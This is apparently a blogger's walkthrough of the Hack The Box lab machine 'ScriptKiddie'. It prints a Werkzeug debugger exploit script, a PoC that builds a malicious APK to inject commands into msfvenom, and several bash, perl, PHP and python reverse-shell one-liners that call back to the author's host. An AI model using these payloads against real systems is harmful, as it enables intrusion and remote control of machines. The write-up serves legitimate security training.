---
title: "ScriptKiddie"
author: "Me"
date: "March 18, 2021"
output: html_document
---

# ScriptKiddie

 <div id="boxinfo">
 <div id="textbox">
 <p class="alignleft">**Difficulty**: easy (4.1/10)</p>
 <p class="aligncenter">**Type**: CTF</p>
 <p class="alignright">**OS**: Linux</p>
 </div>
 <div style="clear: both;"></div>
 </div> 

<div class="img_container">
![desc]({{https://jsom1.github.io/}}/_images/htb_sk_desc.png){: height="250px" width = "280px"}
</div>

**Ports/services exploited:** 5000/http
**Tools:** \\
**Techniques:** \\
**Keywords:** werkzeug\\


## 1. Port scanning
{:style="color:DarkRed; font-size: 170%;"}

As usual, let's perform a nmap scan with the flags *-sV* to have a verbose output, *-O* to enable OS detection, and *-sC* to enable the most common scripts scan.

<div class="img_container">
![nmap]({{https://jsom1.github.io/}}/_images/htb_sk_nmap.png)
</div>

There's only SSH and a web server running, let's have a look at this latter.

## 2. Find and exploit vulnerabilities
{:style="color:DarkRed; font-size: 170%;"}

We browse to 10.10.10.226:5000 and find the following page:

<div class="img_container">
![web site]({{https://jsom1.github.io/}}/_images/htb_sk_site.png)
</div>

While will try its functionnalities, we start dirbuster in the background:

````
sudo dirb http://10.10.10.226:5000 -r
`````
We see the web service is "Werkzeug". From the internet, it is not a web server like Apache or nginx for example, but a **WSGI** (Web Server Gateway Interface) utility framework for python. In a nutshell, it describes how a web server communicates with web applications and also provides a debugger that permits to execute code from within the browser. The documentation warns to **not use the debugger on anything in production since it allows to execute python code remotely**. However, it seems that this warning is often ignored. We can search for systems that have the debugger enabled by causing an exception.\\
It's also mentionned that Werkzeug requires an actual error to trigger the console. The reason for that is that it uses a secret key generated when the application starts and is only exposed in the debugger page...\\
Because the machine is called ScriptKiddie, there's probably an existing exploit for that vulnerability. Let's search for it in the tool (it's the third tool on the page si it's not in the image above):

<div class="img_container">
![try tool]({{https://jsom1.github.io/}}/_images/htb_sk_tool.png)
</div>

It indeed returns two exploits. Since *dirb* didn't find anything, we will have a deeper look at those exploits. There are two of them, the first one is a python exploit while the latter is a ruby script that is part of the Metasploit framework. Metasploit's multi/handler often provides more stable revershe shells, but let's try the python one first. We can see its content with *cat /usr/share/exploitdb/exploits/multiple/remote/43905.py*, which is the following:

````
#!/usr/bin/env python
import requests
import sys
import re
import urllib

# usage : python exploit.py 192.168.56.101 5000 192.168.56.102 4422 

if len(sys.argv) != 5:
    print "USAGE: python %s <ip> <port> <your ip> <netcat port>" % (sys.argv[0])
    sys.exit(-1)


response = requests.get('http://%s:%s/console' % (sys.argv[1],sys.argv[2]))

if "Werkzeug " not in response.text:
    print "[-] Debug is not enabled"
    sys.exit(-1)

# since the application or debugger about python using python for reverse connect 
cmd = '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);''' % (sys.argv[3],sys.argv[4])

__debugger__ = 'yes'

frm = '0'

response = requests.get('http://%s:%s/console' % (sys.argv[1],sys.argv[2]))

secret = re.findall("[0-9a-zA-Z]{20}",response.text)

if len(secret) != 1:
    print "[-] Impossible to get SECRET"
    sys.exit(-1)
else:
    secret = secret[0]
    print "[+] SECRET is: "+str(secret)

# shell
print "[+] Sending reverse shell to %s:%s, please  use netcat listening in %s:%s" % (sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4])

raw_input("PRESS ENTER TO EXPLOIT")

data = {
        '__debugger__' : __debugger__,
        'cmd' : str(cmd),
        'frm' : frm,
        's' : secret
        }


response = requests.get("http://%s:%s/console" % (sys.argv[1],sys.argv[2]), params=data,headers=response.headers)

print "[+] response from server"
print "status code: " + str(response.status_code)
print "response: "+ str(response.text)
`````
This script seems to be honest and easy to use. We see a reference to the debugger mentionned earlier. It will ask us to setup a netcat listener at some point. Let's just try it. I fist copy the script on my desktop with *cp /usr/share/exploitdb/exploits/multiple/remote/43905.py .*. We then use it with the syntax *python exploit.pty target_IP target_port my_IP netcat_port*. I'll set up the listener on port 4444 with the command *sudo nc -nlvp 4444*. We get our ip with *sudo ifconfig tun0*. We can then try the script:

<div class="img_container">
![exploit fail]({{https://jsom1.github.io/}}/_images/htb_sk_fail.png)
</div>

This error is returned if "Werkzeug " is not in the response of the GET request "GET http://10.10.10.226:5000/console". Obviously this exploit won't work if the debugger isn't enabled... Let's still analyze the request in details... We can use Burp or Wireshark to see it. I'll use Wireshark this time. We just have to capture traffic on the tun0 interface and try the previous command once again. We then see the three-ways handshake and the GET request among all the packets:

<div class="img_container">
![wireshark packets]({{https://jsom1.github.io/}}/_images/htb_sk_ws1.png)
</div>

We an right click on this packet and select *Follow* -> *TCP stream*. We then see the response of the server:

<div class="img_container">
![TCP stream]({{https://jsom1.github.io/}}/_images/htb_sk_ws2.png)
</div>

Unsurprisingly, we see the file *console* was not found... The console is supposed to be triggered by an erorr, but there is no such thing in the exploit... Let's try the simplest things first and have a look at the Metasploit exploit. Maybe this one will work? We start Metasploit with *sudo msfconsole -q* (-q for quiet), and then *search werkzeug*. We *use* it and *set* the required options:

<div class="img_container">
![Metasploit fail]({{https://jsom1.github.io/}}/_images/htb_sk_metasploit.png)
</div>

The script also fails but with a different error. Looking at the script (*cat /usr/share/exploitdb/exploits/python/remote/37814.rb*), we see it could be for the same reason. In the *target* options when setting up the exploit, there is only one available: "werkzeug 0.10 and older". We saw on nmap that the target version is 0.16.1, so maybe this is why it's not working and we might be on the wrong way. At this point I started a full TCP scan as well as a top 1000 ports UDP scan to make sure there isn't another way in. However it didn't reveal anything.\\

Let's review what we know so far. We know we have to cause an error that should trigger the console. However, we can't access /console if the debugger mode is not active... We saw earlier that "Debug is not enabled", so I think we must find another way.\\
Let's get back to the tool and try to encode a payload for the target:

<div class="img_container">
![Payload]({{https://jsom1.github.io/}}/_images/htb_sk_payload.png)
</div>

It doesn't work. I naively try to browse to 10.10.10.226:5000/console to see if the error somehow spawned the console, but it wasn't the case. It seems these exploits won't work as long as the debugger is not enabled. Maybe there is a way to do it? Could we somehow upload a file containing instructions to activate the debugger and get it executed?\\
From the description, we can imagine this functionnality uses *msfvenom* under the hood to encode the payload. Let's try to add a template file. I tried to add a random script and got the error "linux requires a elf ext template file*. I uploaded an elf file, but it didn't give anything...\\
I used Burp to intercept requests and tried every functionnalities on the page. I don't really know what to do anymore, but let's try to update msfconsole and see if there has been something new recently. I currently have v5.0.71-dev. The command is the following:

````
sudo apt  update
sudo apt-get install metasploit-framework
`````

Then, we start Metasploit again. I encountered the following error: *Unable to find a spec satisfying metasploit-framework (>= 0) in the set. Perhaps the lockfile is corrupted?
Run bundle install to install missing gems.*. The following commands fixed the problem:

````
sudo gem install bundler -v 2.2.4
sudo msfdb reinit
sudo msfconsole
`````
Finally, we start msfconsole and get the newest version. In my case, I went from 5.0.71 to 6.0.34. We find the exploit, the options are similar but we can add our host IP as well as the listening port. Sadly it still doesn't work.\\
Let's get back to the web page... There are 3 tools: one that performs a nmap scan, one that encode a payload and one that searches for exploit. Under the hood, the server executes commands such as *sudo nmap given_ip*, *sudo msfvenom [...]*, and *searchsploit given_string*. The one where we encounter errors is the encoder, so let's focus on that. It is kind of out of pure luck and despair that I found something interesting by googling "msfencode vulnerability". Apparently, there is an msfvenom APK Template Command Injection module which exploits a vulnerability in msfvenom payload generator when using a crafted APK file as an Android payload template.\\
One of the OS options on the website is Android, so that's probably not a coincidence. On the Rapid7's page, there is the command to launch the module in msfconsole:

````
use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
````
The options are the following:

<div class="img_container">
![Exploit options]({{https://jsom1.github.io/}}/_images/htb_sk_options.png)
</div>

It's weird that there is no remote host option. I googled "APK template exploit" and found the Github page of the author where he explains it in details and gives a PoC: https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md.\\
It is said that **when there's a vulnerability in offensive software such as Metasploit, the attacker becomes the victim**.

I'll rewrite the description of this command injection vulnerability here to better understand it. The vulnerability arises when using a crafted APK file as an Android payload template. We saw on the website that we can upload a template file, so that sounds good so far. Under the hood, the online tool uses **msfvenom** to generate and encode a payload. Msfvenom allows to provide a template by using the *-x* flag.\\
For example, we could embed a meterpreter payload within a file called *calc.exe* with the following command:

````
./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe
````

To generate an Android payload, we give msfvenom an APK template, which is an Android software package. The vulnerability is a command injection that occurs when msfvenom handles these APK files when used as templates.\\
**An attacker could trick an msfvenom user into using a crafted APK file as a template could execute arbitrary commands on the user's system**. This is exactly what we need! In our case, the server is the msfvenom user who pass it our template file. Our job is thus to create an APK file. It is also mentionned that using any file as a payload template *should* be a safe operation for the attacker because during payload generation, the template is not executed on the attacker's machine. The payload is simply the file within which the generated payload will be embedded.\\

I won't go into the technical details, but here's a modified POC of a python script that produces a crafted APK file that executes a given command-line payload when used as a template. We will call this script *msfvenom_apk_template.py*. Originally, the payload was *'echo "Code execution as $(id)" > /tmp/win'*. Let's try to modify that to get a reverse shell on our machine with the payload *nc -nv 10.10.14.22 4444*. We also 

````
#!/usr/bin/env python3
import subprocess
import tempfile
import os
from base64 import b64encode

# Change me
payload = 'nc -nv 10.10.14.22'

# b64encode to avoid badchars (keytool is picky)
payload_b64 = b64encode(payload.encode()).decode()
dname = f"CN='|echo {payload_b64} | base64 -d | sh #"

print(f"[+] Manufacturing evil apkfile")
print(f"Payload: {payload}")
print(f"-dname: {dname}")
print()

tmpdir = tempfile.mkdtemp()
apk_file = os.path.join(tmpdir, "evil.apk")
empty_file = os.path.join(tmpdir, "empty")
keystore_file = os.path.join(tmpdir, "signing.keystore")
storepass = keypass = "password"
key_alias = "signing.key"

# Touch empty_file
open(empty_file, "w").close()

# Create apk_file
subprocess.check_call(["zip", "-j", apk_file, empty_file])

# Generate signing key with malicious -dname
subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,
                       "-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])

# Sign APK using our malicious dname
subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file,
                       "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])

print()
print(f"[+] Done! apkfile is at {apk_file}")
print(f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null")
`````

We then give the file execute permissions with *chmod 755 msfvenom_apk_template.py* and we can generate a malicious APK file with *./msfvenom_apk_template.py*. I first had an error "FieNotFoundError: No such file or directory: 'jarsigner': 'jarsigner'. This can be resolved by installing default-jdk with the following command:

````
sudo apt-get install default-jdk
`````

Then we run the script:

<div class="img_container">
![PoC]({{https://jsom1.github.io/}}/_images/htb_sk_poc.png)
</div>

We can see if it works by uploading this file into the online tool and setting up a listener on port 4444 to catch the revershe shell:

<div class="img_container">
![Upload evil on site]({{https://jsom1.github.io/}}/_images/htb_sk_evil.png)
</div>

We then click on generate to make the server execute the msfvenom command and check if we get a shell:

<div class="img_container">
![Catch rev shell]({{https://jsom1.github.io/}}/_images/htb_sk_shell.png)
</div>

We have a shell, but we can't execute anything. In the image above, I executed some commands to go from a non-interactive shell to an interactive one, but it didn't work (from the post https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell/p1). The same happens with a bind shell. I also tried to specify /bin/bash in the payload's command (*sudo nc -nv 10.10.14.22 4444 -e /bin/bash*), but in that case we don't even catch a shell back.\\
Let's try with Metasploit's multi/handler (we saw at the end of the script that the command executed by the server is *msfvenom -x evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null*), as it might be better at catching specific payload shells. We set up the different options and select an android/meterpreter/reverse_tcp payload:

<div class="img_container">
![multi handler]({{https://jsom1.github.io/}}/_images/htb_sk_multihandler.png)
</div>

We see it started a listener and we're ready to catch a shell. We reupload the file evil.apk on the server and see what happens:

<div class="img_container">
![multi handler fail]({{https://jsom1.github.io/}}/_images/htb_sk_multihandlerfail.png)
</div>

As we did manually earlier with *python -c 'import pty;pty.spawn("/bin/bash");'*, we can use the command *shell* to make multi/handler automatically try to pop various shells. Sadly, it didn't work here either.
So far both netcat and metasploit catch a shell back, but we can't do anything... We can probably use another payload to get a shell. Sometimes the target doesn't have netcat (even though our target should since it connected back to us). In this case, we can use other shells. There are several others such as:

- Bash reverse shell:
````
bash -i>& /dev/tcp/10.10.14.22/4444 0>&1
````
- Perl reverse shell: 
````
perl -e ‘use Socket;$i=”10.10.14.22″;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
`````
- PHP reverse shell (PHP is often present on web servers): 
`````
php -r ‘$sock=fsockopen(“10.10.14.22”,4444);exec(“/bin/sh -i <&3 >&3 2>&3”);’
`````
- Python reverse shell:
````
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.14.22”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
````

I tried all of them and nothing works.







<ins>**My thoughts**</ins>



